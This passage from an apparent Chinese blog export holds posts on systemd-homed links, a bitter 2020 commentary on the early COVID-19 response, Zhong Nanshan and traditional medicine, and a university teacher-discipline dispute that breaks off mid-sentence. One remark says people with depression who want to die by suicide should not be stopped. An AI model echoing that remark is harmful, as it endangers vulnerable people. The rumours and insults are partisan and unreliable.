<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1N5c3RlbWQtaG9tZWQ=">https://wiki.archlinux.org/index.php/Systemd-homed<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1VzZXJzX2FuZF9ncm91cHNfKOeugOS9k+S4reaWhyk=">https://wiki.archlinux.org/index.php/Users_and_groups_(简体中文)<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0NPTlZFUlRJTkdfVE9fSE9NRUQv">https://systemd.io/CONVERTING_TO_HOMED/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy9mZ2M5MWIvd2l0aF9zeXN0ZW1kXzI0NV9sYW5kaW5nX2luX3JlcG9zX3N5c3RlbWRob21lZF9pcy8=">https://www.reddit.com/r/archlinux/comments/fgc91b/with_systemd_245_landing_in_repos_systemdhomed_is/<i class="fa fa-external-link-alt"></i></span> 在Arch上使用的reddit讨论，archwiki的页面也是这个帖子的楼主写的</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpYS5jY2MuZGUvdi9BU0cyMDE5LTE2NC1yZWludmVudGluZy1ob21lLWRpcmVjdG9yaWVz">https://media.ccc.de/v/ASG2019-164-reinventing-home-directories<i class="fa fa-external-link-alt"></i></span> 一个传教视频</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jZnAuYWxsLXN5c3RlbXMtZ28uaW8vbWVkaWEvaG9tZWQtYXNnMjAxOS5wZGY=">https://cfp.all-systems-go.io/media/homed-asg2019.pdf<i class="fa fa-external-link-alt"></i></span> 一个传教PPT</p>
<p>其他的一些简介</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eHJldmlld3Mub3JnL1N5c3RlbWQtSG9tZWRfSXNfTWVyZ2VkX0FuZF9JdF9XaWxsX0Z1bmRhbWVudGFsbHlfQ2hhbmdlX0xpbnV4X0hvbWVfRGlyZWN0b3JpZXM=">https://linuxreviews.org/Systemd-Homed_Is_Merged_And_It_Will_Fundamentally_Change_Linux_Home_Directories<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjaHJlcHVibGljLmNvbS9hcnRpY2xlL2xpbnV4LWhvbWUtZGlyZWN0b3J5LW1hbmFnZW1lbnQtaXMtYWJvdXQtdG8tdW5kZXJnby1tYWpvci1jaGFuZ2Uv">https://www.techrepublic.com/article/linux-home-directory-management-is-about-to-undergo-major-change/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>homectl</tag>
        <tag>systemd-homed</tag>
      </tags>
  </entry>
  <entry>
    <title>毕竟狂澜挽不回，遽怜遗蜕化飞灰</title>
    <url>/70c8/</url>
    <content><![CDATA[<p>So this is how liberty die, with thunderous applause <a id="more"></a></p>
<p>这次非典，我感觉不对劲的时间挺早，。那八个人被训诫荣登央视的时候我就再不说话了，大路朝天，各走一边。 相信可防可控就信去吧，劝是劝不住的，我倒是会喝茶。 想来我也算半个医学逃兵，颇有些惭愧</p>
<blockquote>
<p>凄然不作零丁叹，检点平生未尽心</p>
</blockquote>
<p>元旦就看到江宁狗这个反向指标洋洋得意跑出来喷粪，又过了两天看到新加坡和香港有动静了，再一看查处造谣都上央视了，那稳了。你甚至不需要医学知识，除非你第一天生活在人间。</p>
<p>然而现在恰恰逃兵是正确选择，扁鹊望桓侯而还走，管轶惊惶弃武汉回港</p>
<p>我什么也不想说，1月20号坐飞机回家之前，周围师兄师姐一会去春熙路逛街买新衣服一会出去玩，老板一会带我们去川大华西商量制造科研垃圾，一会说准备一下到肿瘤医院把之前的科研垃圾中期结题一下，并没有人感觉异常，我也不想自讨没趣。只能把去春熙路和出去玩找个借口推了，找个心理安慰，毕竟教研室巴掌大的地方，真出事一个也躲不掉。</p>
<p>爱国爱党信中医的景润师兄12号回了黄冈，淡定的一匹，比电视上的群众还淡定，我又何必自讨没趣呢</p>
<p><img src="/70c8/jingrun.webp" /></p>
<p>求仁得仁，复何怨哉</p>
<h2 id="六朝如梦">六朝如梦</h2>
<p>经此一疫，又有一群不食人间烟火的人黄粱梦醒，纷纷如丧考妣，惊讶愤怒心痛，只觉所住非人间。你们是第一天住在人间吗？或许是承平日久了，想想这十几年真是好日子过多了，真觉得和平发展充满爱是世界主流了，这一片绿油油的韭菜不割都对不住韭菜。就像之前的故宫大G，愤怒可以理解，惊讶就太外宾了。 难道你们不知道权贵一直如此？ 难道你们第一天接触慈善和红会？ 难道你们第一天活在地球？</p>
<p>天下大乱、礼崩乐坏、风起云涌，这是一个王佐之才如过江之鲫的时代，这是一个两脚羊的时代。 管他春秋繁荣还是六朝纷乱，反正都比虚假繁荣的皇朝有意思多了。</p>
<p>前一阵奥斯卡奖,一群人居然又开始吹捧寄生虫了。寄生虫刚出来的时候我扫了一眼两极分化的影评我就不想看了，实在没意思。小丑也没意思，至少不如爱尔兰人，我感觉快把蝙蝠侠三部曲的牌子给砸了。建议奥斯卡也加大力度，回头和WHO比比哪个更搞笑。 还有一些人哀叹中国影视文艺百花凋零，那大可不必，你看到这个暗流涌动的世界了吗?实在没有必要看那些电影工作者和文艺工作者的自嗨产物,更没必要理会电影工作者自己给自己颁的奖。更何况近五年来影视界和五年前十年前比实在没意思。你们小时候读过儿歌和故事，甚至被要求背过课本上的文章吧；我反正经常有种被喂屎的感觉，他们就喜欢搞一堆<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTGllLXRvLWNoaWxkcmVu">骗小孩<i class="fa fa-external-link-alt"></i></span>的玩意，他们还装小孩语气说话写课本（虽然装得一点也不小孩），然后小孩还要背诵他们装小孩的东西（顺便来个读后感）。 现在的问题是越来越多电影制作者装高深和整天把观众当傻子，观众却不买帐了。 反正我看到一些有脑子的社会活动家和键政人士纷纷表示寄生虫这电影就是个垃圾，有点作为半个动物爱好者的我看<span class="exturl" data-url="aHR0cHM6Ly90cmFuc2xhdGlvbnMuaGVhZHNhbG9uLm9yZy9wb3N0LzIwMTgvMDcv6ZqP5bCP6bm/5paR5q+U6ICM55Sf55qE5paH5YyW5r2u5rWBLw==">小鹿斑比<i class="fa fa-external-link-alt"></i></span>的样子,更恰当地说，学机械的工科狗看到有人吹高达的设计和威力的样子。实在是太假了，简直有违常识，韩国电影当年有很多好的深刻的讽刺现实作品，这几年用力过度甚至失去了常识（虽然韩国的猎奇片子一向就喜欢为了猎奇抛弃常识）。有人说韩国影视界近年来进步很大，我觉得恰恰相反。</p>
<p>一些吃瓜群众人纷纷表示不服，看到寄生虫获奖：就这？就这？就这？ 大有项羽见始皇帝出游，“彼可取而代也”的感觉 哦，不，是看了湖北政府，“我也能当省长”的感觉</p>
<h2 id="他们都不说人话">他们都不说人话</h2>
<blockquote>
<p>社会主义没有失业,那叫下岗</p>
</blockquote>
<p>有人怕了，就怕跟SARS扯上关系啊</p>
<p>这病毒终于还是有了个名字叫SARS-cov-2，然而国内官媒一个个都有意回避SARS的说法，甚至绝口不提非典，非得叫新型冠状病毒，却又说不是SARS 我们随便点开一个百科,比如默沙东手册:</p>
<blockquote>
<p>严重急性呼吸综合征（SARS）是由SARS冠状病毒（SARS-CoV）引起的严重急性呼吸道疾病。</p>
</blockquote>
<p>这可不就是SARS，这次疾病就叫 SARS2 我看正合适。 WHO（Winne Happy Orgnization）不管这个叫 SARS，当然了，他们还满口可防可控不列疫区，我建议WHO加大力度，力度再大点就可以被总书记<strong>亲自批准</strong>火线入党了，岂不美哉</p>
<p>你们还是说点人话吧，什么2019-nCov啊，什么NCP啊，特色社会主义都能叫社会主义，这新型冠状病毒都不算SARS？</p>
<h2 id="国士垂垂老矣">国士垂垂老矣</h2>
<p>元旦那会我觉得这个可能要闹大,当时也没想到会闹成今天这个样子。</p>
<p>钟南山那个儒贼出来我就感觉要坏事，却没想到从上到下如此不堪。 03年非典，蒋先生做出了青史留名的举动，涛哥不戴口罩亲临广州街头，臊子面稳住了北京。今天只留下了一个又一个笑话，让大家觉得“彼可取而代也”</p>
<p>大家一边吹捧钟南山，一边骂双黄连和可防可控，我看得哭笑不得。 钟南山当年的板蓝根和可防可控大家都忘了吗？莲花清瘟都忘了吗？ 他可不是糊涂，他自己是不信的。他父亲都是反中医的。</p>
<figure>
<img src="/70c8/板蓝根.webp" alt="板蓝根" /><figcaption aria-hidden="true">板蓝根</figcaption>
</figure>
<p>以下内容直接复制自维基百科 &gt;2月11日上午，广州市政府召开新闻发布会公布广州地区非典型肺炎情况，称所有病人的病情均在控制当中。强调对于广州千万人口300多人染病是个很小的比例，非典型肺炎只是局部发生，河源中山等市已无新发病例报告。还解释了2月前前阶段没有公布情况的原因是：河源中山等地的患者经过治疗大多已康复或好转没有再发病，非典型肺炎并不是法定报告传染病，而发病人数305例并不算多。负责人强调会按传染病法公布疫情。 &gt;同日下午，广东省卫生厅举行情况通报会。中国工程院院士钟南山表示，市民到公众场所进行正常的活动是不会受到感染的，宣布广东大中小学将会如期开学。专家还指出，从临床角度看，可能是由病毒引起的，也有可能是病毒的亚型或变种引起的。对于患者的治疗都是采用“对症下药”的方法。</p>
<p>当然了，肯定有人让我闭嘴，我算个什么东西，哎，我还真不算个东西。 我一个稀里糊涂读了几年生物医学工程的工科狗，给自己脸上贴金也只能算半个医学相关闲杂人等，跑到知乎<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>去说两句，能引来几千个人追着骂我。（2020年的，2013年前的应该不能）</p>
<p>那我就贴一点<span class="exturl" data-url="aHR0cHM6Ly93d3cud2VpYm8uY29tL3UvMTgyOTg3MDIxMg==">小儿外科裴医生<i class="fa fa-external-link-alt"></i></span>的话 (以下内容大段粘贴，指不定哪天号就没了，留个备份，前几天刚炸了一大批怼中医的)</p>
<blockquote>
<p>小儿外科裴医生<br />
2019-9-8 09:36 来自 iPhone客户端 你要是以为钟南山在这个“科普”中讲到莲花清瘟胶囊是无意的，或者他只是因为没有了解这个药，那就太幼稚了，人家不蠢，只是没有节操，为了利益，用自己的学术地位给那些没用的药站台背书，就是恶。<span class="exturl" data-url="aHR0cDovL2hiLmNoaW5hZGFpbHkuY29tLmNuL2EvMjAxOTA5LzA3L1dTNWQ3MzhmNjdhMzEwOTlhYjk5NWRlOTNmLmh0bWw=">O“知感冒·防流感——全民科普公益行”活动在汉举... ​​​​<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>这活动还有视频哦（太长了就只贴个图好了）</p>
<p><img src="/70c8/莲花清瘟.webp" /></p>
<p>这底下有个评论：</p>
<blockquote>
<p>fanbobb：如果有人问我，连我们最该拥有权威的院士，前几天还有正能量新闻的院士，都宣传中成药，你还成天说中药是骗人的吗？我作为一个非医学专业的普通人还真有点哑口无言</p>
</blockquote>
<p>我也哑口无言。</p>
<blockquote>
<p>小儿外科裴医生 2月2日 22:07 来自 iPhone 11 Pro 面对一个大家都不太了解的病毒，被感染了有什么丢脸，为什么要用此这么恶毒的词？我觉得他比钟南山客观、务实、专业、真实多了。//<span class="citation" data-cites="st5873:这样草包还有脸出来到处接受采访">@st5873:这样草包还有脸出来到处接受采访</span> <span class="citation" data-cites="小儿外科裴医生">@小儿外科裴医生</span> 中青报对这篇对@北大呼吸发哥 的访谈很不错，推荐大家看看。O卫健委专家组成员王广发出院了，回答了我们8... ​​​​</p>
</blockquote>
<blockquote>
<p>阿瓦达啃大瓜1633：回复@蓝小诺CC:几年前亲耳听钟老板在欧洲呼吸病年会分会上演讲说他们团队研究治疗H1N1板蓝根有效，莲花清韵胶囊有效，当初差点以为听错了，那时才明白钟老板那一刻的身份是行政官员不是医生。</p>
</blockquote>
<p>下面这段已经被删了,戳到某些人的脊梁骨了。这里我手动加粗，以免太长不看的读者在跳读我写的这一堆垃圾时错过重点内容</p>
<blockquote>
<p><span class="citation" data-cites="小儿外科裴医生:专业我就说几个词吧">@小儿外科裴医生:专业我就说几个词吧</span>：<strong>连花清瘟、板蓝根、装修致白血病、兰菌净、羧甲司坦、口罩</strong>。//<span class="citation" data-cites="嘛咪嘛咪-hong:所以我想知道钟南山哪儿不客观">@嘛咪嘛咪-hong:所以我想知道钟南山哪儿不客观</span>，不务实，不专业，不真实呢？（非杠，真心请教）</p>
</blockquote>
<p>当然很多都删了，还有很多没有说出口（很多话我也没说出口）</p>
<blockquote>
<p>昨天在隔壁号我又有一篇文章被删了，算上之前被删的和推送不出去的，整个疫情期我有约1/10的文章没法见人，昨天看到棒棒医生的那篇循证的崩溃的文章也被删了，医学专业人员连专业问题都不能讨论和发言，那可能是这块土地真的不再需要专业和科学了。 ​​​​</p>
</blockquote>
<p>19年10月钟南山还在搞：<span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlcGFwZXIuY24vbmV3c0RldGFpbF9mb3J3YXJkXzQ3MzExMDY=">钟南山：正研发新版板蓝根，药效或强五六倍<i class="fa fa-external-link-alt"></i></span>，还给莲花清瘟站台，对了，还有虫草呢（就是内含重金属，改变了平西王历史的进程的那个虫草）</p>
<p><img src="/70c8/冬虫夏草.webp" /></p>
<p>什么叫国士无双啊，战术后仰</p>
<p><img src="/70c8/pilipili.webp" /></p>
<p>另，友情提示，李兰娟的人品、水平和能力还不如钟南山。</p>
<p>没多少人提起，蒋先生的往事 据说蒋先生现在身体也不太好，唉</p>
<figure>
<img src="/70c8/蒋彦永.webp" alt="蒋彦永先生" /><figcaption aria-hidden="true">蒋彦永先生</figcaption>
</figure>
<p>“我之所以能直面现实，是因为我相信我们的国家。因为国家如果能从我提供的这些情况吸取一定的教训，因此建立好公共防疫制度，从SARS的挑战与困境中站起来，获得全世界人民的信任。”</p>
<p>这次怕是让老爷子心寒了</p>
<p>当然某人青年时代就亲自读过莎士比亚，并且在15年引经据典告诉过我们：“凡是过去，皆为序章”。<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></p>
<p><em>我将无我，亲自指挥</em></p>
<p>正常表现罢了</p>
<blockquote>
<p>因笑王谢诸人，登高怀远，也学英雄涕</p>
</blockquote>
<h2 id="我还是说点什么吧">我还是说点什么吧</h2>
<p>建议大家多屯点粮食</p>
<p>有钱记得做空美股（当然你也可以拿期权做空A股，只要你不怕投机倒把当场击毙）</p>
<p>对野生动物保护持续悲观（你看见之前环保部门煤改气了吧）</p>
<p>再多说两句，流浪猫狗应该跟本次非典没有太大关系，不管有没有关系，流浪猫狗本就应该组织扑杀（收容和安乐是宠保人士和猫奴狗奴的事，政府以极大浪费<del>纳税人</del>韭菜的血汗钱进行收容和安乐都是不合适的，TNR属于迁就猫奴狗奴的绥靖行为，同样不可取）。 昆明滇池的红嘴鸥和黔灵山公园的猕猴今年缺少游客喂食，景区组织投喂，这是十分不好的。</p>
<p>下面贴一些鸟类爱好者的话：</p>
<p>[中土饲养员]：有研究表明人为投喂淀粉类的面包蛋糕等会降低各种鸥类育雏的成功率，但是还好红嘴鸥只把昆明当成补充体力的中转站 <span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vdS82NTUyODkzNjc1">JK协捕队2世<i class="fa fa-external-link-alt"></i></span>： <span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vdS81ODMyOTk3NTA0">漂泊极北鲵<i class="fa fa-external-link-alt"></i></span>：...首先 这是红嘴鸥Chroicocephalus ridibundus 不是海鸥Larus canus 其次这些鸥已经被喂得彻底与自然环境分离了 这是在毒害它们 没事请与野生动物保持距离，不要乱摸、投喂，除了保育和救助等都不要打扰动物 动物园和景区里的也不行，很多动物园和景区做得都不好，禁止投喂的牌子并不管用，工作人员也制止不过来</p>
<p>我只是半个动物爱好者，这里就不自己扯淡了, 这是一篇土澳学生物的博主写一篇长微博：<span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vMzk2MjEzNTI2Mi9Jc3k3OUJIUEE=">https://weibo.com/3962135262/Isy79BHPA<i class="fa fa-external-link-alt"></i></span> 我抄一点过来: &gt;人类的食物，如面包、薯条、饼干，高油高盐，高热量高糖分，对野生动物的健康极为不利，多表现为肥胖、肾衰竭、毛发脱落等。因为人类的饮食根本不是它们自然食物链的一部分。不天然的饮食及其附属物，例如塑料袋、油污，也会污染野生动物的自然栖息地。 &gt;亲密接触野生动物增加疾病的传播概率，这点在当下这个时候，想必不用再过多说明了吧？某市以投喂红嘴鸥为荣的，鸟类身上携带什么疾病来着，禽流感啊，好自为之！去高原上摸旱獭喂食旱獭，自私且无耻，将自己暴露在甲级传染病鼠疫病原的触碰范围内，你又为你家人想过吗？犰狳是恐怖的麻风病宿主，很多小型食肉动物传播狂犬病，动物身体体表和体内的各种寄生虫，野生动物从来都不好惹。 &gt;使野生动物依赖人类获取食物。这次疫情限制出行，很多问题就暴露出来了，为什么贵州那群猴子和某市的红嘴鸥离不开人的投喂了？这是个恶性循环啊，本来就不该投喂野生动物，养成依赖了，现在甩不了手，离不开人了，出了事动物们自己不会觅食，纷纷饿死，有得去投喂，这个循环刹不住车了，你觉得是好事吗。就说红嘴鸥吧，这种鸟类本来还是候鸟，人家到点了想飞走就飞走，想留下就留下，一投喂全留下了，这基数不断变大，竞争压力也不断变大。红嘴鸥的自然种群数量庞大，适应力很好，年前跑鸟类调查，上万只反正是随随便便看到了，它们也不是什么濒危物种，完全不依靠人类“救援”。所以这事，从一开始做的就不对，不是说你现在不投喂要出问题，是一开始就压根不该投喂，动物不是人，它脑子里只有吃和繁殖，这样强行转变了它们的生存策略，到最后只能是出问题。</p>
<p>还有这方面的疑问不建议问我，请直接去问他们</p>
<p>中医早已变成一个庞大的利益集团，随便一个阿胶之类的体量都在鸿茅药酒十倍以上。总规模和能量加起来应该不低于清真食品产业链。 我不想说什么中医了，我也不拦着，谁爱信谁信。以前看到有人想不开，我都觉得应该劝劝，现在抑郁症想自杀的人我都觉得不应该拦着，信中医就我就更不反对了，都是个人选择，尊重个人意愿。非公共场合抽烟也是个人意愿，还能成为光荣的<del>纳税人</del>烟草局韭菜。喝中药对他人危害并不高于香烟，还能解决医保和老龄化的难题，顺便进行智商筛选。</p>
<p>在现代医学已经发展到这个样子的今天，再想想《赠医者汤伯高序》文末“嗟夫，使世之医皆若虚、伯高，信之者皆吾里之人，巫其能久胜矣乎”，问题的答案是：你别说，还真能！</p>
<p>楚俗信巫不信医，今天群魔乱舞自称中医的一群人，基本都是跳大神的巫医，谋财害命之徒。可以粗暴的认为是一个宗教性质的东西。</p>
<p>再有人问中医怎样，我建议你们这样安利他们：试试恒河水，这个纯天然，效果也很好，还免费</p>
<p>死生有命，富贵在天 善哉，善哉</p>
<blockquote>
<p>庚子年春，大雪，惊雷，天有五日,瘟疫封城</p>
</blockquote>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>https://www.zhihu.com/question/28634829<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>http://politics.people.com.cn/n/2015/1021/c1001-27724579.html<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
  </entry>
  <entry>
    <title>郑文锋老师的四大发明事件始末</title>
    <url>/16e8/</url>
    <content><![CDATA[<p>今天在<span class="exturl" data-url="aHR0cHM6Ly91ZXN0Yy5pY3U=">uestc.icu<i class="fa fa-external-link-alt"></i></span>和微博上看见好几次，貌似出了个红头文件处理结果，无法确定真假。当时最早那个知乎问题上了知乎热搜第一的时候我也目睹了。在这里随便扯一下吧，夹杂大量个人主观判断。 <a id="more"></a> <img width=200 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/xzx.jpg" alt="镇楼"/></p>
<p>起因是一名研究生<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9sb2c=">在知乎发帖<i class="fa fa-external-link-alt"></i></span>，想搞个大新闻，此前貌似就在河畔发帖试图搞个大新闻未遂，被獾狸猿删除后转战知乎。然而事与愿违，确实火了，但是是被喷上热搜的，而且登顶热搜第一。这里不得不再一次说你电公关确实了得，大半夜的热搜瞬间被撤，掉下来后又上了热搜，又瞬间从第二名掉到十几名;而且问题下面的回答还在以肉眼可见的速度不断减少，从接近两千变成一千五百多，又变成一千三百多，即便算上被折叠的评论，也是有问题的。而且该问题还被隐藏了，直接知乎站内搜索你是搜不到的（现在直接搜依然搜不到） <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic1.PNG" alt="最初的问题" /></p>
<h3 id="想搞个大新闻的学生">想搞个大新闻的学生</h3>
<p>对于该研究生，我个人是鄙夷的。当时几乎目睹了全过程。将老师挂起来公然批斗。然而匿名提问，还把自己在QQ截图中的头像名称全都打码，知乎提问却直接指名道姓，上来就“公然侮辱”，滑天下之大稽。 此外还有该生之前完全旷课理亏在先等，此处不表。</p>
<p>电卫兵，电卫兵.jpg <img width=300 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/student1.jpg" alt="电卫兵言论大赏"/> 擦屁股言论可真是太搞笑了 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5OTM4OTQ4MC9hbnN3ZXIvNTE2NDQyMzg3">https://www.zhihu.com/question/299389480/answer/516442387<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/beifeng.PNG" alt="北风三号机" /></p>
<p>而一些难以证实的传言和截图表明此事行为更加恶劣 <img width=300 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E5%8A%88%E6%88%90.jpg" alt="小道消息"/></p>
<h3 id="郑文锋老师">郑文锋老师</h3>
<p>我也不认识郑老师，也没上过他的课，跟他不熟 （或许我读研时有机会去看看他的课，如果他不是真被处分停课的话）</p>
<p>之前核心通识课程上过自动化学院谢永乐老师的课，闭着眼谢永乐老师，当时那个课只有一个学分，但是谢老师很“事多”。每节课必点名，而且几乎每个人都要认一遍（其实每个人都要认一遍，谢老师基本每个人都很关心，这个课是小班，不到二十个人，想逃课或者水过去是不可能的），还要经常把每个请上台讲一下自己的观点。而且中途还要交作业，几千字（具体多少字忘了，反正不少于五千）的小论文，期中期末各一次，必须手写。谢老师讲课时非常有热情，批改也及其认真。这就造成了这门课强度几乎高于很多两三个学分的必修课。 这似乎也导致了这门课的评价两极分化，一些人唯恐避之不及，一些人觉得这是个很好的老师。 谢老师是很欢迎我们讨论的，自己说“不搞一言堂，我们也不是文革，只有一个声音”，把我们拉上去讨论也很希望出现新的见解。谢老师上课很认真，备课也很负责，看得出来谢老师是真的喜欢传统文化，真的很喜欢古诗词。（不过虽然他确实读了不少古文古诗，但是章口就莱时还是念错不少字，被刚高考完半年的我敏锐地挑了出来） 说来惭愧，谢老师表扬过我，本人至今还和谢老师是微信好友。现在我基本修完大学所有的学分了，谢老师文学水平且不提，感觉这么较真的课程已经超过绝大部分必修了。</p>
<p>再次表示本人与郑老师没有交集，但是看这几个月知乎微博河畔上我电学生的评价，绝大部分说好，一些人说不好。我觉得这个郑老师应该属于这种很“事多”的老师，不然这种课水水就过去了，大家都轻松愉快，何必呢。（不认识郑老师，随便猜测）。当然还有种可能就是老师拿着鸡毛当令箭，私货很多，类似侯伦广，像这个回答说的那样： <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvNzk5NTc3NTAx">如何看待称「四大发明在世界上都不领先」高校老师因“师德失范”遭停课两年？ - 挤按睛明穴的回答 - 知乎<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827101306.png" alt="知乎回答" /> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MjA0OTI5OC9hbnN3ZXIvNzk4NDU2MDYw">如何看待称「四大发明在世界上都不领先」高校老师因「师德失范」遭停课两年？ - 朝经暮史的回答 - 知乎<i class="fa fa-external-link-alt"></i></span>里面一些早期负面评价截图 一个河畔回答，我看到好多人都说这门课全程录像，那不妨请学校把录像放出来我们看看 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20190827100038.png" alt="一个河畔回答" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FyY2hhZW9yYXB0b3IvaW1hZ2VfcmVzb3VyY2VzL0ltYWdlb2ZCbG9nLyVFNSU4QSU4OCVFNiU5RiVCNC5qcGc=">河畔小道消息<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="该课程问题驱动的创新创业">该课程（问题驱动的创新创业）</h3>
<p>俺们本科生也有这个课，算在核心通识的 研究生的不太了解，道听途说的情况： 0.5学分，开在研一下学期，选修，很多人公认的水课，据说很多人期末交个1000字的小论文就水过去了</p>
<p>但是郑老师要求15000字，貌似比较“事多” 至于怎么看待所谓的水课，这就是另一个问题了，这里不表 (更新，期末应该是8000字，10%查重，15000字是总计几次小论文合计字数)</p>
<p>更新，这是个人文交流月的课程，貌似上课时间只有一周 这样看来0.5学分、选修课，确实这么重的任务有些过分了 至于为什么有这种尴尬课程，这就要从李校长的“人文气息”说起（请各路明星和于丹、六老师这种货色），从李中堂"大众创业万众创新"说起（指坑韭菜的钱）</p>
<h3 id="电子科技大学师德建设委员会文件">电子科技大学师德建设委员会文件</h3>
<p>这个今天（2019.8.21）在微博等网站火起来的文件高斯模糊、来源不明，我暂时无法判定真假。</p>
<p>但是很多人人说那个师德建设委员会不存在，妹听说过，学校官网上查不到这么个机构；我只想说，善用搜索引擎啊同志们，这个是真实存在的，我就随手这么一谷歌，就找到了你电官网上的相关新闻，而且还看到了那个盖章的党委教师工作部，这么看红头文件可不太像是假的啊。 就是下面这个网址，谷歌搜索结果的第二名，赫然在列 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment3.PNG" alt="谷歌结果" /> <span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTY3MTE4">https://news.uestc.edu.cn/?n=UestcNews.Front.Document.ArticlePage&amp;Id=67118<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment2.PNG" alt="电子科技大学师德建设委员会" /> 点进去第一条： &gt;一、加强组织保障，完善工作机制 出台《电子科技大学师德师风建设实施办法》，构建学校党委统一领导、二级单位组织实施、教师主动参与的师德建设工作体系。组织成立学校师德建设工作委员会，负责师德建设工作总体规划；成立党委教师工作部，具体负责制度建设、组织落实、督导检查等工作。制定二级单位师德建设工作任务清单，明确二级单位党委师德建设职能职责，将师德师风建设纳入二级单位年度目标考核。强化教师自我教育，坚持将师德建设作为加强教师自身建设的重要内容，规定教师每年必须参加不少于2个学时的师德教育，并将学习情况纳入教师年度考核。</p>
<p>而我们打开另一条新闻<span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTcyMzgy">学校举行第四期思政及师德师风培训班结业典礼暨师德师风建设专题会议<i class="fa fa-external-link-alt"></i></span>，还可以看到 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/partment4.PNG" alt="师德建设委员会" /> &gt;师德师风巡视员张开华、汤炎灿、徐全智、赵璧全、马立香、姜书艳，师德建设委员会成员单位负责人、312名培训学员，全体“青字号”人才，学院党委书记、学院分管教学、研究生、学生工作的副院长、副书记，全体教职工党支部书记、组织员，辅导员，学院教务科、研究生科工作人员等参加会议。教师发展中心主任罗小蓉主持会议。 &gt; 师德建设委员会成员赫然在列</p>
<p>这个知乎回答说的很好，文件不像是假的： &gt;作者：之乎者也 链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTg3NjU4NC9hbnN3ZXIvNzk3NjYyMTI1">https://www.zhihu.com/question/341876584/answer/797662125<i class="fa fa-external-link-alt"></i></span> 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 一大波自认为专业的人从公文行文格式的角度分析这是份假文件，还说得头头是道。特别是 生之初尚无为 